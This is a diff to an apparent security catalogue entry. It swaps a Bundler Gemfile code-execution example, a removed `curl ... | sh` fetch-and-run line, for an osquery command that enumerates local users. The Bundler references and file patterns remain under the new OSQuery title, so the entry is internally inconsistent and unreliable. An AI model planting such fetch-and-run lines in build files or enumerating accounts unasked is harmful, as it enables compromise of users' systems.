@@ -1,8 +1,8 @@
 ---
 title: OSQuery
 tags:
-- cli
-- eval-sh
+- Enum
+- Exec
 - config-file
 references: 
 - https://bundler.io/v2.5/man/bundle-config.1.html
@@ -10,10 +10,10 @@ files: ['Gemfile', '*.gemspec*', '.bundle/config']
 purl: pkg:gem/bundler
 ---
 
-Bundler is Ruby's package manager. It uses a Ruby file called `Gemfile` to specify dependencies and versions. Any Ruby code can be added to it and will be executed when the `bundle` command is run.
+osquery is an operating system instrumentation framework for Windows, OS X (macOS), and Linux. The tools make low-level operating system analytics and monitoring both performant and intuitive..
 
-```ruby
-system("curl ... | sh")
+```Enumerate users
+osqueryi --json "SELECT username, description, sid, directory FROM users;"
 ```
 
 
